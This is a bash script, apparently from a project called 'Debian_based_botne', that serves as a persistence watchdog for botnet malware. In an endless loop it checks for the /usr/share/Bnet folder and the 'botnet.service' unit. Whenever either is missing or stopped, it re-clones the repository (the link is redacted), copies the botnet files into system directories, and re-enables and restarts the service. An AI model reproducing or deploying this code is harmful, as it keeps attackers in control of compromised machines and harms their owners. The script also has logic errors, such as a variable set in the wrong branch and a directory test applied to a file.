#Har har Mahadev
#!/bin/bash


# Folder check
folder="/usr/share/Bnet"

while true; do
    if [ ! -d "$folder" ]; then
    	#this and else statment done same job i know .. just for bee in safe side .. ( to much thinking ;)
    	git clone [link]
    	cp Debian_based_botne/Bnet/botnet.service /etc/systemd/system/
        cp -r Debian_based_botne/Bnet /usr/share/ 
    	systemctl enable botnet.service
    	systemctl start botnet.service 
    	systemctl daemon-reload
    fi

    sleep 5 

    # botnet.service check
    service_name="botnet.service"

    if ! systemctl is-active --quiet "$service_name"; then

    	systemctl daemon-reload
    	systemctl enable botnet.service
    	systemctl start botnet.service 

    serv_file="/etc/systemd/system/botnet.service"
    elif [[ ! -d "$serv_file" ]]; then
    	
    	systemctl daemon-reload
    	cp /usr/share/Bnet/botnet.service /etc/systemd/system/
    	systemctl enable botnet.service
    	systemctl start botnet.service 
    	systemctl daemon-reload
    else

    	git clone [link]
    	cp Debian_based_botne/Bnet/botnet.service /etc/systemd/system/
        cp -r Debian_based_botne/Bnet /usr/share/ 
    	systemctl enable botnet.service
    	systemctl start botnet.service 
    	systemctl daemon-reload

    fi

    sleep 5  
done
